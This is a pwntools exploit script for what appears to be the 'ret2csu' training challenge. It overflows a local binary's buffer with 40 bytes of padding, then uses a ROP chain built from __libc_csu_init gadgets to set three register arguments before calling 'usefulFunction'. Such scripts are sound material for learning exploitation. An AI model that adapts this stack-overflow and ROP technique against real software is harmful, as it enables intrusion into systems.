from pwn import *
elf = context.binary = ELF("./ret2csu")
r = elf.process()

gdb.attach(r , 
'''
    b*pwnme+152\n
    c
''')
###############
#  ROP chain  #
###############
pop_rdi_ret = 0x4006a3
pop_rsi_r15_ret = 0x4006a1
pop_rbx_rbp_r12_r13_r14_r15 = 0x40069a
mov_rdx_r15_rsi_r14_edi_r13 = 0x400680
_init = 0x4004d0
param1 = 0xdeadbeefdeadbeef
param2 = 0xcafebabecafebabe
param3 = 0xd00df00dd00df00d
usefulFunction = 0x40062a
###############
#   Exploit   #
###############
payload = flat(
    "A" * 40,
    pop_rbx_rbp_r12_r13_r14_r15,
    0, # rbx
    1, # rbp
    0x600e38, #r12
    0x0, #r13
    param2, #r14
    param3, #r15
    mov_rdx_r15_rsi_r14_edi_r13,
    0x0, # rbx
    0x0, # rbp
    0x0, #r12
    0x0, #r13
    param2, #r14
    param3, #r15
    0x0,
    pop_rdi_ret,
    param1,
    usefulFunction
)
r.sendline(payload)
r.interactive()